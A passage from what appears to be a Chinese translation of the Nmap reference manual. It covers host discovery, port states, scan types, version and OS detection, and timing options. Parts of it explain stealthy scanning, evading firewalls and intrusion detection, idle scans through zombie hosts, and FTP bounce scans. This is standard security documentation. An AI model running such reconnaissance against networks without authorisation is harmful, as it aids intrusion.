DEFAULT-UDP-PROBE-PORT值进行配置。默认使用这样一个奇怪的端口是因为对开放端口 进行这种扫描一般都不受欢迎。\n如果目标机器的端口是关闭的，UDP探测应该马上得到一个ICMP端口无法到达的回应报文。 这对于Nmap意味着该机器正在运行。 许多其它类型的ICMP错误，像主机&#x2F;网络无法到达或者TTL超时则表示down掉的或者不可到达的主机。 没有回应也被这样解释。如果到达一个开放的端口，大部分服务仅仅忽略这个 空报文而不做任何回应。这就是为什么默认探测端口是31338这样一个 极不可能被使用的端口。少数服务如chargen会响应一个空的UDP报文， 从而向Nmap表明该机器正在运行。\n该扫描类型的主要优势是它可以穿越只过滤TCP的防火墙和过滤器。 例如。我曾经有过一个Linksys BEFW11S4无线宽带路由器。默认情况下， 该设备对外的网卡过滤所有TCP端口，但UDP探测仍然会引发一个端口不可到达 的消息，从而暴露了它自己。\n-PE; -PP; -PM (ICMP Ping Types)\n除了前面讨论的这些不常见的TCP和UDP主机发现类型， Nmap也能发送世人皆知的ping 程序所发送的报文。Nmap发送一个ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。 对于网络探索者而言，不幸的是，许多主机和 防火墙现在封锁这些报文，而不是按期望的那样响应， 参见RFC 1122。因此，仅仅ICMP扫描对于互联网上的目标通常是不够的。 但对于系统管理员监视一个内部网络，它们可能是实际有效的途径。 使用-PE选项打开该回声请求功能。\n虽然回声请求是标准的ICMP ping查询， Nmap并不止于此。ICMP标准 (RFC 792)还规范了时间戳请求，信息请求 request，和地址掩码请求，它们的代码分别是13，15和17。 虽然这些查询的表面目的是获取信息如地址掩码和当前时间， 它们也可以很容易地用于主机发现。 很简单，回应的系统就是在运行的系统。Nmap目前没有实现信息请求报文， 因为它们还没有被广泛支持。RFC 1122 坚持 “主机不应该实现这些消息”。 时间戳和地址掩码查询可以分别用-PP和-PM选项发送。 时间戳响应(ICMP代码14)或者地址掩码响应(代码18)表示主机在运行。 当管理员特别封锁了回声请求报文而忘了其它ICMP查询可能用于 相同目的时，这两个查询可能很有价值。\n-PR (ARP Ping)\n最常见的Nmap使用场景之一是扫描一个以太局域网。在大部分局域网上，特别是那些使用基于 RFC1918私有地址范围的网络，在一个给定的时间绝大部分 IP地址都是不使用的。 当Nmap试图发送一个原始IP报文如ICMP回声请求时， 操作系统必须确定对应于目标IP的硬件地址(ARP)，这样它才能把以太帧送往正确的地址。 这一般比较慢而且会有些问题，因为操作系统设计者认为一般不会在短时间内 对没有运行的机器作几百万次的ARP请求。\n当进行ARP扫描时，Nmap用它优化的算法管理ARP请求。当它收到响应时，Nmap甚至不需要担心基于IP的ping报文，既然它已经知道该主机正在运行了。 这使得ARP扫描比基于IP的扫描更快更可靠。 所以默认情况下，如果Nmap发现目标主机就在它所在的局域网上，它会进行ARP扫描。即使指定了不同的ping类型(如 -PI或者 -PS) ，Nmap也会对任何相同局域网上的目标机使用ARP。 如果您真的不想要ARP扫描，指定 –send-ip。\n-n (不用域名解析)\n告诉Nmap 永不对它发现的活动IP地址进行反向域名解析。既然DNS一般比较慢，这可以让事情更快些。\n-R (为所有目标解析域名)\n告诉Nmap 永远 对目标IP地址作反向域名解析。 一般只有当发现机器正在运行时才进行这项操作。\n–system-dns (使用系统域名解析器)\n默认情况下，Nmap通过直接发送查询到您的主机上配置的域名服务器 来解析域名。为了提高性能，许多请求 (一般几十个 ) 并发执行。如果您希望使用系统自带的解析器，就指定该选项 (通过getnameinfo()调用一次解析一个IP)。除非Nmap的DNS代码有bug–如果是这样，请联系我们。 一般不使用该选项，因为它慢多了。系统解析器总是用于IPv6扫描。\n端口扫描基础虽然Nmap这些年来功能越来越多， 它也是从一个高效的端口扫描器开始的，并且那仍然是它的核心功能。 nmap 这个简单的命令扫描主机上的超过 1660个TCP端口。 。许多传统的端口扫描器只列出所有端口是开放还是关闭的， Nmap的信息粒度比它们要细得多。 它把端口分成六个状态: open(开放的)， closed(关闭的)，filtered(被过滤的)， unfiltered(未被过滤的)， open|filtered(开放或者被过滤的)，或者 closed|filtered(关闭或者被过滤的)。\n这些状态并非端口本身的性质，而是描述Nmap怎样看待它们。例如， 对于同样的目标机器的135&#x2F;tcp端口，从同网络扫描显示它是开放的，而跨网络作完全相同的扫描则可能显示它是 filtered(被过滤的)。\nNmap所识别的6个端口状态：\nopen(开放的)\n应用程序正在该端口接收TCP 连接或者UDP报文。发现这一点常常是端口扫描 的主要目标。安全意识强的人们知道每个开放的端口 都是攻击的入口。攻击者或者入侵测试者想要发现开放的端口。 而管理员则试图关闭它们或者用防火墙保护它们以免妨碍了合法用户。 非安全扫描可能对开放的端口也感兴趣，因为它们显示了网络上那些服务可供使用。\nclosed(关闭的)\n关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。 它们可以显示该IP地址上(主机发现，或者ping扫描)的主机正在运行up 也对部分操作系统探测有所帮助。 因为关闭的关口是可访问的，也许过会儿值得再扫描一下，可能一些又开放了。 系统管理员可能会考虑用防火墙封锁这样的端口。 那样他们就会被显示为被过滤的状态，下面讨论。\nfiltered(被过滤的)\n由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。这样的端口让攻击者感觉很挫折，因为它们几乎不提供 任何信息。有时候它们响应ICMP错误消息如类型3代码13 (无法到达目标: 通信被管理员禁止)，但更普遍的是过滤器只是丢弃探测帧， 不做任何响应。 这迫使Nmap重试若干次以访万一探测包是由于网络阻塞丢弃的。 这使得扫描速度明显变慢。\nunfiltered(未被过滤的)\n未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。 只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。 用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。\nopen|filtered(开放或者被过滤的)\n当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。\nclosed|filtered(关闭或者被过滤的)\n该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。\n端口扫描技术作为一个修车新手，我可能折腾几个小时来摸索怎样把基本工具(锤子，胶带，扳子等) 用于手头的任务。当我惨痛地失败，把我的老爷车拖到一个真正的技师那儿的时候 ，他总是在他的工具箱里翻来翻去，直到拽出一个完美的工具然后似乎不费吹灰之力搞定它。 端口扫描的艺术和这个类似。专家理解成打的扫描技术，选择最适合的一种 (或者组合)来完成给定的 任务。 另一方面，没有经验的用户和刚入门者总是用默认的SYN扫描解决每个问题。 既然Nmap是免费的，掌握端口扫描的唯一障碍就是知识。这当然是汽车世界所不能比的， 在那里，可能需要高超的技巧才能确定您需要一个压杆弹簧压缩机，接着您还得为它付数千美金。\n大部分扫描类型只对特权用户可用。 这是因为他们发送接收原始报文，这在Unix系统需要root权限。 在Windows上推荐使用administrator账户，但是当WinPcap已经被加载到操作系统时， 非特权用户也可以正常使用Nmap。当Nmap在1997年发布时，需要root权限是一个严重的 局限，因为很多用户只有共享的shell账户。现在，世界变了，计算机便宜了，更多人拥有互联网连接 ，桌面UNIX系统 (包括Linux和MAC OS X)很普遍了。Windows版本的Nmap现在也有了，这使它可以运行在更多的桌面上。 由于所有这些原因，用户不再需要用有限的共享shell账户运行Nmap。 这是很幸运的，因为特权选项让Nmap强大得多也灵活得多。\n虽然Nmap努力产生正确的结果，但请记住所有结果都是基于目标机器(或者它们前面的防火墙)返回的报文的。 。这些主机也许是不值得信任的，它们可能响应以迷惑或误导Nmap的报文。 更普遍的是非RFC兼容的主机以不正确的方式响应Nmap探测。FIN，Null和Xmas扫描 特别容易遇到这个问题。这些是特定扫描类型的问题，因此我们在个别扫描类型里讨论它们。\n这一节讨论Nmap支持的大约十几种扫描技术。 一般一次只用一种方法， 除了UDP扫描(-sU)可能和任何一种TCP扫描类型结合使用。 友情提示一下，端口扫描类型的选项格式是-s， 其中 是个显眼的字符，通常是第一个字符。 一个例外是deprecated FTP bounce扫描(-b)。默认情况下，Nmap执行一个 SYN扫描，但是如果用户没有权限发送原始报文(在UNIX上需要root权限)或者如果指定的是IPv6目标，Nmap调用connect()。 本节列出的扫描中，非特权用户只能执行connect()和ftp bounce扫描。\n-sS (TCP SYN扫描)\nSYN扫描作为默认的也是最受欢迎的扫描选项，是有充分理由的。 它执行得很快，在一个没有入侵防火墙的快速网络上，每秒钟可以扫描数千个 端口。 SYN扫描相对来说不张扬，不易被注意到，因为它从来不完成TCP连接。 它也不像Fin&#x2F;Null&#x2F;Xmas，Maimon和Idle扫描依赖于特定平台，而可以应对任何兼容的 TCP协议栈。 它还可以明确可靠地区分open(开放的)， closed(关闭的)，和filtered(被过滤的) 状态\n它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。 SYN&#x2F;ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。如果数次重发后仍没响应， 该端口就被标记为被过滤。如果收到ICMP不可到达错误 (类型3，代码1，2，3，9，10，或者13)，该端口也被标记为被过滤。\n-sT (TCP connect()扫描)\n当SYN扫描不能用时，CP Connect()扫描就是默认的TCP扫描。 当用户没有权限发送原始报文或者扫描IPv6网络时，就是这种情况。 Instead of writing raw packets as most other scan types do，Nmap通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，而不像其它扫描类型直接发送原始报文。 这是和Web浏览器，P2P客户端以及大多数其它网络应用程序用以建立连接一样的 高层系统调用。它是叫做Berkeley Sockets API编程接口的一部分。Nmap用 该API获得每个连接尝试的状态信息，而不是读取响应的原始报文。\n当SYN扫描可用时，它通常是更好的选择。因为Nmap对高层的 connect()调用比对原始报文控制更少， 所以前者效率较低。 该系统调用完全连接到开放的目标端口而不是像SYN扫描进行 半开放的复位。这不仅花更长时间，需要更多报文得到同样信息，目标机也更可能 记录下连接。IDS(入侵检测系统)可以捕获两者，但大部分机器没有这样的警报系统。 当Nmap连接，然后不发送数据又关闭连接， 许多普通UNIX系统上的服务会在syslog留下记录，有时候是一条加密的错误消息。 此时，有些真正可怜的服务会崩溃，虽然这不常发生。如果管理员在日志里看到来自同一系统的 一堆连接尝试，她应该知道她的系统被扫描了。\n-sU (UDP扫描)\n虽然互联网上很多流行的服务运行在TCP 协议上，UDP服务也不少。 DNS，SNMP，和DHCP (注册的端口是53，161&#x2F;162，和67&#x2F;68)是最常见的三个。 因为UDP扫描一般较慢，比TCP更困难，一些安全审核人员忽略这些端口。 这是一个错误，因为可探测的UDP服务相当普遍，攻击者当然不会忽略整个协议。 所幸，Nmap可以帮助记录并报告UDP端口。\nUDP扫描用-sU选项激活。它可以和TCP扫描如 SYN扫描 (-sS)结合使用来同时检查两种协议。\nUDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的)。 偶尔地，某服务会响应一个UDP报文，证明该端口是open(开放的)。 如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。 这意味着该端口可能是开放的，也可能包过滤器正在封锁通信。 可以用版本扫描(-sV)帮助区分真正的开放端口和被过滤的端口。\nUDP扫描的巨大挑战是怎样使它更快速。 开放的和被过滤的端口很少响应，让Nmap超时然后再探测，以防探测帧或者 响应丢失。关闭的端口常常是更大的问题。 它们一般发回一个ICMP端口无法到达错误。但是不像关闭的TCP端口响应SYN或者Connect 扫描所发送的RST报文，许多主机在默认情况下限制ICMP端口不可到达消息。 Linux和Solaris对此特别严格。例如， Linux 2.4.20内核限制一秒钟只发送一条目标不可到达消息 (见net&#x2F;ipv4&#x2F;icmp。c)。\nNmap探测速率限制并相应地减慢来避免用那些目标机会丢弃的无用报文来阻塞 网络。不幸的是，Linux式的一秒钟一个报文的限制使65,536个端口的扫描要花 18小时以上。加速UDP扫描的方法包括并发扫描更多的主机，先只对主要端口进行快速 扫描，从防火墙后面扫描，使用–host-timeout跳过慢速的 主机。\n-sN; -sF; -sX (TCP Null，FIN，and Xmas扫描)\n这三种扫描类型 (甚至用下一节描述的 –scanflags 选项的更多类型) 在TCP RFC中发掘了一个微妙的方法来区分open(开放的)和 closed(关闭的)端口。第65页说“如果 [目标]端口状态是关闭的…. 进入的不含RST的报文导致一个RST响应。” 接下来的一页 讨论不设置SYN，RST，或者ACK位的报文发送到开放端口: “理论上，这不应该发生，如果您确实收到了，丢弃该报文，返回。 ”\n如果扫描系统遵循该RFC，当端口关闭时，任何不包含SYN，RST，或者ACK位的报文会导致 一个RST返回，而当端口开放时，应该没有任何响应。只要不包含SYN，RST，或者ACK， 任何其它三种(FIN，PSH，and URG)的组合都行。Nmap有三种扫描类型利用这一点：\nNull扫描 (-sN)\n不设置任何标志位(tcp标志头是0)\nFIN扫描 (-sF)\n只设置TCP FIN标志位。\nXmas扫描 (-sX)\n设置FIN，PSH，和URG标志位，就像点亮圣诞树上所有的灯一样。\n除了探测报文的标志位不同，这三种扫描在行为上完全一致。 如果收到一个RST报文，该端口被认为是 closed(关闭的)，而没有响应则意味着 端口是open|filtered(开放或者被过滤的)。 如果收到ICMP不可到达错误(类型 3，代号 1，2，3，9，10，或者13)，该端口就被标记为 被过滤的。\n这些扫描的关键优势是它们能躲过一些无状态防火墙和报文过滤路由器。 另一个优势是这些扫描类型甚至比SYN扫描还要隐秘一些。但是别依赖它 – 多数 现代的IDS产品可以发现它们。一个很大的不足是并非所有系统都严格遵循RFC 793。 许多系统不管端口开放还是关闭，都响应RST。 这导致所有端口都标记为closed(关闭的)。 这样的操作系统主要有Microsoft Windows，许多Cisco设备，BSDI，以及IBM OS&#x2F;400。 但是这种扫描对多数UNIX系统都能工作。这些扫描的另一个不足是 它们不能辨别open(开放的)端口和一些特定的 filtered(被过滤的)端口，从而返回 open|filtered(开放或者被过滤的)。\n-sA (TCP ACK扫描)\n这种扫描与目前为止讨论的其它扫描的不同之处在于 它不能确定open(开放的)或者 open|filtered(开放或者过滤的))端口。 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。\nACK扫描探测报文只设置ACK标志位(除非您使用 –scanflags)。当扫描未被过滤的系统时， open(开放的)和closed(关闭的) 端口 都会返回RST报文。Nmap把它们标记为 unfiltered(未被过滤的)，意思是 ACK报文不能到达，但至于它们是open(开放的)或者 closed(关闭的) 无法确定。不响应的端口 或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的)。\n-sW (TCP窗口扫描)\n除了利用特定系统的实现细节来区分开放端口和关闭端口，当收到RST时不总是打印unfiltered， 窗口扫描和ACK扫描完全一样。 它通过检查返回的RST报文的TCP窗口域做到这一点。 在某些系统上，开放端口用正数表示窗口大小(甚至对于RST报文) 而关闭端口的窗口大小为0。因此，当收到RST时，窗口扫描不总是把端口标记为 unfiltered， 而是根据TCP窗口值是正数还是0，分别把端口标记为open或者 closed\n该扫描依赖于互联网上少数系统的实现细节， 因此您不能永远相信它。不支持它的系统会通常返回所有端口closed。 当然，一台机器没有开放端口也是有可能的。 如果大部分被扫描的端口是 closed，而一些常见的端口 (如 22， 25，53) 是 filtered，该系统就非常可疑了。 偶尔地，系统甚至会显示恰恰相反的行为。 如果您的扫描显示1000个开放的端口和3个关闭的或者被过滤的端口， 那么那3个很可能也是开放的端口。\n-sM (TCP Maimon扫描)\nMaimon扫描是用它的发现者Uriel Maimon命名的。他在 Phrack Magazine issue #49 (November 1996)中描述了这一技术。 Nmap在两期后加入了这一技术。 这项技术和Null，FIN，以及Xmas扫描完全一样，除了探测报文是FIN&#x2F;ACK。 根据RFC 793 (TCP)，无论端口开放或者关闭，都应该对这样的探测响应RST报文。 然而，Uriel注意到如果端口开放，许多基于BSD的系统只是丢弃该探测报文。\n–scanflags (定制的TCP扫描)\n真正的Nmap高级用户不需要被这些现成的扫描类型束缚。 –scanflags选项允许您通过指定任意TCP标志位来设计您自己的扫描。 让您的创造力流动，躲开那些仅靠本手册添加规则的入侵检测系统！\n–scanflags选项可以是一个数字标记值如9 (PSH和FIN)， 但使用字符名更容易些。 只要是URG， ACK，PSH， RST，SYN，and FIN的任何组合就行。例如，–scanflags URGACKPSHRSTSYNFIN设置了所有标志位，但是这对扫描没有太大用处。 标志位的顺序不重要。\n除了设置需要的标志位，您也可以设置 TCP扫描类型(如-sA或者-sF)。 那个基本类型告诉Nmap怎样解释响应。例如， SYN扫描认为没有响应意味着 filtered端口，而FIN扫描则认为是 open|filtered。 除了使用您指定的TCP标记位，Nmap会和基本扫描类型一样工作。 如果您不指定基本类型，就使用SYN扫描。\n-sI &lt;zombie host[:probeport]&gt; (Idlescan)\n这种高级的扫描方法允许对目标进行真正的TCP端口盲扫描 (意味着没有报文从您的真实IP地址发送到目标)。相反，side-channel攻击 利用zombie主机上已知的IP分段ID序列生成算法来窥探目标上开放端口的信息。 IDS系统将显示扫描来自您指定的zombie机(必须运行并且符合一定的标准)。 这种奇妙的扫描类型太复杂了，不能在此完全描述，所以我写一篇非正式的论文， 发布在https://nmap.org/book/idlescan.html。\n除了极端隐蔽(由于它不从真实IP地址发送任何报文)， 该扫描类型可以建立机器间的基于IP的信任关系。 端口列表从zombie 主机的角度。显示开放的端口。 因此您可以尝试用您认为(通过路由器&#x2F;包过滤规则)可能被信任的 zombies扫描目标。\n如果您由于IPID改变希望探测zombie上的特定端口， 您可以在zombie 主机后加上一个冒号和端口号。 否则Nmap会使用默认端口(80)。\n-sO (IP协议扫描)\nIP 协议扫描可以让您确定目标机支持哪些IP协议 (TCP，ICMP，IGMP，等等)。从技术上说，这不是端口扫描 ，既然它遍历的是IP协议号而不是TCP或者UDP端口号。 但是它仍使用 -p选项选择要扫描的协议号， 用正常的端口表格式报告结果，甚至用和真正的端口扫描一样 的扫描引擎。因此它和端口扫描非常接近，也被放在这里讨论。\n除了本身很有用，协议扫描还显示了开源软件的力量。 尽管基本想法非常简单，我过去从没想过增加这一功能也没收到任何对它的请求。 在2000年夏天，Gerhard Rieger孕育了这个想法，写了一个很棒的补丁程序，发送到nmap-hackers邮件列表。 我把那个补丁加入了Nmap，第二天发布了新版本。 几乎没有商业软件会有用户有足够的热情设计并贡献他们的改进。\n协议扫描以和UDP扫描类似的方式工作。它不是在UDP报文的端口域上循环， 而是在IP协议域的8位上循环，发送IP报文头。 报文头通常是空的，不包含数据，甚至不包含所申明的协议的正确报文头 TCP，UDP，和ICMP是三个例外。它们三个会使用正常的协议头，因为否则某些系 统拒绝发送，而且Nmap有函数创建它们。协议扫描不是注意ICMP端口不可到达消息， 而是ICMP 协议不可到达消息。如果Nmap从目标主机收到 任何协议的任何响应，Nmap就把那个协议标记为open。 ICMP协议不可到达 错误(类型 3，代号 2) 导致协议被标记为 closed。其它ICMP不可到达协议(类型 3，代号 1，3，9，10，或者13) 导致协议被标记为 filtered (虽然同时他们证明ICMP是 open )。如果重试之后仍没有收到响应， 该协议就被标记为open|filtered\n-b (FTP弹跳扫描)\nFTP协议的一个有趣特征(RFC 959) 是支持所谓代理ftp连接。它允许用户连接到一台FTP服务器，然后要求文件送到一台第三方服务器。 这个特性在很多层次上被滥用，所以许多服务器已经停止支持它了。其中一种就是导致FTP服务器对其它主机端口扫描。 只要请求FTP服务器轮流发送一个文件到目标主机上的所感兴趣的端口。 错误消息会描述端口是开放还是关闭的。 这是绕过防火墙的好方法，因为FTP服务器常常被置于可以访问比Web主机更多其它内部主机的位置。 Nmap用-b选项支持ftp弹跳扫描。参数格式是 :@:。 是某个脆弱的FTP服务器的名字或者IP地址。 您也许可以省略:， 如果服务器上开放了匿名用户(user:anonymous password:-wwwuser@)。 端口号(以及前面的冒号) 也可以省略，如果使用默认的FTP端口(21)。\n当Nmap1997年发布时，这个弱点被广泛利用，但现在大部分已经被fix了。 脆弱的服务器仍然存在，所以如果其它都失败了，这也值得一试。 如果您的目标是绕过防火墙，扫描目标网络上的开放的21端口(或者 甚至任何ftp服务，如果您用版本探测扫描所有端口)， 然后对每个尝试弹跳扫描。Nmap会告诉您该主机脆弱与否。 如果您只是试着玩Nmap，您不必(事实上，不应该)限制您自己。 在您随机地在互联网上寻找脆弱的FTP服务器时，考虑一下系统管理员不太喜欢您这样滥用他们的服务器。\n端口说明和扫描顺序除了所有前面讨论的扫描方法， Nmap提供选项说明那些端口被扫描以及扫描是随机还是顺序进行。 默认情况下，Nmap用指定的协议对端口1到1024以及nmap-services 文件中列出的更高的端口在扫描。\n-p (只扫描指定的端口)\n该选项指明您想扫描的端口，覆盖默认值。 单个端口和用连字符表示的端口范围(如 1-1023)都可以。 范围的开始以及&#x2F;或者结束值可以被省略， 分别导致Nmap使用1和65535。所以您可以指定 -p-从端口1扫描到65535。 如果您特别指定，也可以扫描端口0。 对于IP协议扫描(-sO)，该选项指定您希望扫描的协议号 (0-255)。\n当既扫描TCP端口又扫描UDP端口时，您可以通过在端口号前加上T: 或者U:指定协议。 协议限定符一直有效您直到指定另一个。 例如，参数 -p U:53，111，137，T:21-25，80，139，8080 将扫描UDP 端口53，111，和137，同时扫描列出的TCP端口。注意，要既扫描 UDP又扫描TCP，您必须指定 -sU ，以及至少一个TCP扫描类型(如 -sS，-sF，或者 -sT)。如果没有给定协议限定符， 端口号会被加到所有协议列表。\n-F (快速 (有限的端口) 扫描)\n在nmap的nmap-services 文件中(对于-sO，是协议文件)指定您想要扫描的端口。 这比扫描所有65535个端口快得多。 因为该列表包含如此多的TCP端口(1200多)，这和默认的TCP扫描 scan (大约1600个端口)速度差别不是很大。如果您用–datadir选项指定您自己的 小小的nmap-services文件 ，差别会很惊人。\n-r (不要按随机顺序扫描端口)\n默认情况下，Nmap按随机顺序扫描端口 (除了出于效率的考虑，常用的端口前移)。这种随机化通常都是受欢迎的， 但您也可以指定-r来顺序端口扫描。\n服务和版本探测把Nmap指向一个远程机器，它可能告诉您 端口25&#x2F;tcp，80&#x2F;tcp，和53&#x2F;udp是开放的。使用包含大约2,200个著名的服务的 nmap-services数据库， Nmap可以报告那些端口可能分别对应于一个邮件服务器 (SMTP)，web服务器(HTTP)，和域名服务器(DNS)。 这种查询通常是正确的 – 事实上，绝大多数在TCP端口25监听的守护进程是邮件 服务器。然而，您不应该把赌注押在这上面! 人们完全可以在一些奇怪的端口上运行服务。\n即使Nmap是对的，假设运行服务的确实是 SMTP，HTTP和DNS，那也不是特别多的信息。 当为您的公司或者客户作安全评估(或者甚至简单的网络明细清单)时， 您确实想知道正在运行什么邮件和域名服务器以及它们的版本。 有一个精确的版本号对了解服务器有什么漏洞有巨大帮助。 版本探测可以帮您获得该信息。\n在用某种其它类型的扫描方法发现TCP 和&#x2F;或者UDP端口后， 版本探测会询问这些端口，确定到底什么服务正在运行。 nmap-service-probes 数据库包含查询不同服务的探测报文 和解析识别响应的匹配表达式。 Nmap试图确定服务协议 (如 ftp，ssh，telnet，http)，应用程序名(如ISC Bind，Apache httpd，Solaris telnetd)，版本号， 主机名，设备类型(如 打印机，路由器)，操作系统家族 (如Windows，Linux)以及其它的细节，如 如是否可以连接X server，SSH协议版本 ，或者KaZaA用户名)。当然，并非所有服务都提供所有这些信息。 如果Nmap被编译成支持OpenSSL， 它将连接到SSL服务器，推测什么服务在加密层后面监听。 当发现RPC服务时， Nmap RPC grinder (-sR)会自动被用于确定RPC程序和它的版本号。 如果在扫描某个UDP端口后仍然无法确定该端口是开放的还是被过滤的，那么该端口状态就 被标记为open|filtered。 版本探测将试图从这些端口引发一个响应(就像它对开放端口做的一样)， 如果成功，就把状态改为开放。 open|filtered TCP端口用同样的方法对待。 注意Nmap -A选项在其它情况下打开版本探测。 有一篇关于版本探测的原理，使用和定制的文章在http://www.insecure.org/nmap/vscan/。\n当Nmap从某个服务收到响应，但不能在数据库中找到匹配时， 它就打印一个特殊的fingerprint和一个URL给您提交，如果您确实知道什么服务运行在端口。 请花两分钟提交您的发现，让每个人受益。由于这些提交， Nmap有350种以上协议如smtp，ftp，http等的大约3，000条模式匹配。\n用下列的选项打开和控制版本探测：\n-sV (版本探测)\n打开版本探测。 您也可以用-A同时打开操作系统探测和版本探测。\n–allports (不为版本探测排除任何端口)\n默认情况下，Nmap版本探测会跳过9100 TCP端口，因为一些打印机简单地打印送到该端口的 任何数据，这回导致数十页HTTP get请求，二进制 SSL会话请求等等被打印出来。这一行为可以通过修改或删除nmap-service-probes 中的Exclude指示符改变， 您也可以不理会任何Exclude指示符，指定–allports扫描所有端口\n–version-intensity (设置 版本扫描强度)\n当进行版本扫描(-sV)时，nmap发送一系列探测报文 ，每个报文都被赋予一个1到9之间的值。 被赋予较低值的探测报文对大范围的常见服务有效，而被赋予较高值的报文 一般没什么用。强度水平说明了应该使用哪些探测报文。数值越高， 服务越有可能被正确识别。 然而，高强度扫描花更多时间。强度值必须在0和9之间。 默认是7。当探测报文通过nmap-service-probes ports指示符 注册到目标端口时，无论什么强度水平，探测报文都会被尝试。这保证了DNS 探测将永远在任何开放的53端口尝试， SSL探测将在443端口尝试，等等。\n–version-light (打开轻量级模式)\n这是 –version-intensity 2的方便的别名。轻量级模式使 版本扫描快许多，但它识别服务的可能性也略微小一点。\n–version-all (尝试每个探测)\n–version-intensity 9的别名， 保证对每个端口尝试每个探测报文。\n–version-trace (跟踪版本扫描活动)\n这导致Nmap打印出详细的关于正在进行的扫描的调试信息。 它是您用–packet-trace所得到的信息的子集。\n-sR (RPC扫描)\n这种方法和许多端口扫描方法联合使用。 它对所有被发现开放的TCP&#x2F;UDP端口执行SunRPC程序NULL命令，来试图 确定它们是否RPC端口，如果是， 是什么程序和版本号。因此您可以有效地获得和rpcinfo -p一样的信息， 即使目标的端口映射在防火墙后面(或者被TCP包装器保护)。Decoys目前不能和RPC scan一起工作。 这作为版本扫描(-sV)的一部分自动打开。 由于版本探测包括它并且全面得多，-sR很少被需要。\n操作系统探测Nmap最著名的功能之一是用TCP&#x2F;IP协议栈fingerprinting进行远程操作系统探测。 Nmap发送一系列TCP和UDP报文到远程主机，检查响应中的每一个比特。 在进行一打测试如TCP ISN采样，TCP选项支持和排序，IPID采样，和初始窗口大小检查之后， Nmap把结果和数据库nmap-os-fingerprints中超过 1500个已知的操作系统的fingerprints进行比较，如果有匹配，就打印出操作系统的详细信息。 每个fingerprint包括一个自由格式的关于OS的描述文本， 和一个分类信息，它提供供应商名称(如Sun)，下面的操作系统(如Solaris)，OS版本(如10)， 和设备类型(通用设备，路由器，switch，游戏控制台， 等)。\n如果Nmap不能猜出操作系统，并且有些好的已知条件(如 至少发现了一个开放端口和一个关闭端口)，Nmap会提供一个 URL，如果您确知运行的操作系统，您可以把fingerprint提交到那个URL。 这样您就扩大了Nmap的操作系统知识库，从而让每个Nmap用户都受益。\n操作系统检测可以进行其它一些测试，这些测试可以利用处理 过程中收集到的信息。例如运行时间检测，使用TCP时间戳选项(RFC 1323) 来估计主机上次重启的时间，这仅适用于提供这类信息的主机。另一种 是TCP序列号预测分类，用于测试针对远程主机建立一个伪造的TCP连接 的可能难度。这对于利用基于源IP地址的可信关系(rlogin，防火墙过滤等) 或者隐含源地址的攻击非常重要。这一类哄骗攻击现在很少见，但一些 主机仍然存在这方面的漏洞。实际的难度值基于统计采样，因此可能会有 一些波动。通常采用英国的分类较好，如“worthy challenge”或者 “trivial joke”。在详细模式(-v)下只以 普通的方式输出，如果同时使用-O，还报告IPID序列产生号。 很多主机的序列号是“增加”类别，即在每个发送包的IP头中 增加ID域值， 这对一些先进的信息收集和哄骗攻击来说是个漏洞。\nhttps://nmap.org/book/osdetect.html文档使用多种语言描述了版本检测的方式、使用和定制。\n采用下列选项启用和控制操作系统检测:\n-O (启用操作系统检测)\n也可以使用-A来同时启用操作系统检测和版本检测。\n–osscan-limit (针对指定的目标进行操作系统检测)\n如果发现一个打开和关闭的TCP端口时，操作系统检测会更有效。 采用这个选项，Nmap只对满足这个条件的主机进行操作系统检测，这样可以 节约时间，特别在使用-P0扫描多个主机时。这个选项仅在使用 -O或-A 进行操作系统检测时起作用。\n–osscan-guess; –fuzzy (推测操作系统检测结果)\n当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认 进行这种匹配，使用上述任一个选项使得Nmap的推测更加有效。\n时间和性能Nmap开发的最高优先级是性能。在本地网络对一个主机的默认扫描(nmap )需要1&#x2F;5秒。而仅仅眨眼的 时间，就需要扫描上万甚至几十万的主机。此外，一些特定的扫描选项会明显增 加扫描时间，如UDP扫描和版本检测。同样，防火墙配置以及特殊的响应速度限制也会 增加时间。Nmap使用了并行算法和许多先进的算法来加速扫描，用户对Nmap如何 工作有最终的控制权。高级用户可以仔细地调整Nmap命令，在满足时间要求的同时获得他们所关心的信息。\n改善扫描时间的技术有：忽略非关键的检测、升级最新版本的Nmap(性能增强不断改善)。 优化时间参数也会带来实质性的变化，这些参数如下。\n–min-hostgroup ; –max-hostgroup (调整并行扫描组的大小)\nNmap具有并行扫描多主机端口或版本的能力，Nmap将多个目标IP地址 空间分成组，然后在同一时间对一个组进行扫描。通常，大的组更有效。缺 点是只有当整个组扫描结束后才会提供主机的扫描结果。如果组的大小定义 为50，则只有当前50个主机扫描结束后才能得到报告(详细模式中的补充信息 除外)。\n默认方式下，Nmap采取折衷的方法。开始扫描时的组较小， 最小为5，这样便于尽快产生结果；随后增长组的大小，最大为1024。确切的 大小依赖于所给定的选项。为保证效率，针对UDP或少量端口的TCP扫描，Nmap 